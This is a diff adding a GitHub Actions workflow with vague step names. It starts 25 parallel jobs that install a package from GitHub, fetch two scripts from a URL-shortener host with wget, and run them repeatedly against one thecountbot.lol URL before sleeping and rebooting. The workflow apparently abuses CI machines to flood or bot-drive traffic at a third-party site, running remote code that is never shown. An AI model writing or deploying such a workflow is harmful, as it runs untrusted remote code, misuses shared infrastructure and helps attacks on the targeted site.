@@ -1,0 +1,37 @@
+name: Rekor !
+
+on:
+  workflow_dispatch:
+
+jobs:
+  vds:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 25
+      matrix:
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+
+    steps:
+      - name: OK !
+        run: |
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/XW2WO/Test.py
+          wget https://curl.by/ripPh/testraw.js
+          chmod +x testraw.js
+          chmod +x Test.py
+          PIDS=()
+          for i in {1..4}; do
+            timeout 300 python3 Test.py https://thecountbot.lol/5043021917-ed084ba6-94a3-488c-9ccd-0f369a9f8c08 && node testraw.js https://thecountbot.lol/5043021917-ed084ba6-94a3-488c-9ccd-0f369a9f8c08 300
+            PIDS+=($!)
+          done
+          
+          for pid in "${PIDS[@]}"; do
+            wait $pid
+          done
+
+      - name: OK !
+        run: sleep 300
+        
+      - name: OK !
+        run: sudo reboot
